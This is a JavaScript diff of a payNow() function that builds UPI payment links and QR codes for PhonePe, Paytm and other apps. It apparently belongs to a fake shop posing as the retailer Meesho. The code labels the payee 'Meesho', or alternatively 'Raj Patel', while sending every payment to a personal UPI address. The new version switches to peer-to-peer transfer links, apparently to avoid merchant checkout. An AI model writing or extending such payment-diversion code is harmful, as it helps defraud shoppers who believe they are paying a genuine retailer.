@@ -67,53 +67,84 @@ let totalPercent = sellingPrice_total * 0.40;
     
     
 function payNow() {
-    // Take order number from JSON (itemData) if provided, otherwise generate a fresh randomized order number
-    var orderNumber = (itemData && (itemData.orderNumber || itemData.order_id || itemData.order_no || itemData.orderId))
-        ? (itemData.orderNumber || itemData.order_id || itemData.order_no || itemData.orderId)
-        : ("ORD" + Date.now() + Math.floor(1000 + Math.random() * 9000));
+  var orderNumber = "ORD" + Date.now() + Math.floor(1000 + Math.random() * 9000);
+  var payType = $(".form-check.active").attr("pay-type") || "phonepe";
+  var redirect_url = "";
+  var site_name = "Raj Patel"; // Or "Meesho"
+  var upi_address = "rajpatel1861997@okaxis";
+  var amt = (itemData && itemData.selling_price) ? parseFloat(itemData.selling_price).toFixed(2) : "0.00";
+  var amountInPaise = Math.round(parseFloat(amt) * 100);
 
-    var payType = $(".form-check.active").attr('pay-type');
-    var redirect_url = "";
-    var site_name = "Meesho";
-    var upi_address = "rajpatel1861997@okaxis";
-    var aid = "uGICAgOD1lfiuLw";
-    var amt = (itemData && itemData.selling_price) ? parseFloat(itemData.selling_price).toFixed(2) : "0.00";
+  var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    var upiQuery = "pa=" + encodeURIComponent(upi_address) +
-                   "&pn=" + encodeURIComponent(site_name) +
-                   "&aid=" + encodeURIComponent(aid) +
-                   "&am=" + amt +
-                   "&cu=INR" +
-                   "&tn=" + encodeURIComponent("Order_" + orderNumber);
+  switch (payType) {
+    case 'qr_code':
+    case 'qr':
+      var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=240x240&margin=8&data=" + encodeURIComponent("upi://pay?pa=" + encodeURIComponent(upi_address) + "&pn=" + encodeURIComponent(site_name) + "&am=" + amt + "&cu=INR&tn=" + encodeURIComponent("Order_" + orderNumber));
+      var qrModal = document.getElementById('qr_modal');
+      if (qrModal) {
+        var qrImg = document.getElementById('qr_code_img');
+        if (qrImg) qrImg.src = qrUrl;
+        $(qrModal).show();
+      } else {
+        window.location.href = qrUrl;
+      }
+      return;
 
-    var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    case "phonepe":
+      if (isIOS) {
+        redirect_url =
+          "phonepe:upi://pay?pa=" + encodeURIComponent(upi_address) +
+          "&pn=" + encodeURIComponent(site_name) +
+          "&am=" + amt +
+          "&cu=INR" +
+          "&tn=" + encodeURIComponent("Order_" + orderNumber);
+      } else {
+        var payload = {
+          p2pPaymentCheckoutParams: {
+            checkoutType: "COLLECT",
+            initialAmount: amountInPaise,
+            note: {
+              type: "text",
+              message: "Order_" + orderNumber,
+            },
+            supportedInstruments: -1,
+          },
+          contact: {
+            type: "EXTERNAL_MERCHANT",
+            name: site_name,
+            vpa: upi_address,
+          },
+        };
+        var encodedPayload = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
+        redirect_url = "phonepe://native?data=" + encodeURIComponent(encodedPayload) + "&id=p2ppayment";
+      }
+      break;
 
-    switch (payType) {
-      case 'qr_code':
-      case 'qr':
-        var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=8&data=" + encodeURIComponent("upi://pay?" + upiQuery);
-        var qrModal = document.getElementById('qr_modal');
-        if (qrModal) {
-          var qrImg = document.getElementById('qr_code_img');
-          if (qrImg) qrImg.src = qrUrl;
-          $(qrModal).show();
-        } else {
-          window.location.href = qrUrl;
-        }
-        return;
-      case 'phonepe':
-        redirect_url = "phonepe://pay?" + upiQuery;
-        break;
-      case 'paytm':
-        redirect_url = "paytmmp://pay?" + upiQuery;
-        break; 
-      case 'bhim_upi':
-      case 'whatsapp':
-      default:
-        redirect_url = "upi://pay?" + upiQuery;
-        break;
-    }
-    window.location.href = redirect_url;
+    case "paytm":
+      redirect_url =
+        "paytmmp://cash_wallet?pa=" + encodeURIComponent(upi_address) +
+        "&pn=" + encodeURIComponent(site_name) +
+        "&am=" + amt +
+        "&cu=INR" +
+        "&tn=" + encodeURIComponent("Order_" + orderNumber) +
+        "&featuretype=money_transfer";
+      break;
+
+    case "bhim_upi":
+    case "whatsapp":
+    default:
+      redirect_url =
+        "upi://pay?pa=" + encodeURIComponent(upi_address) +
+        "&pn=" + encodeURIComponent(site_name) +
+        "&am=" + amt +
+        "&cu=INR" +
+        "&tn=" + encodeURIComponent("Order_" + orderNumber);
+      break;
+  }
+
+  window.location.href = redirect_url;
+}
        
     $(document).ready(function () {
     // Extract parameters from the URL
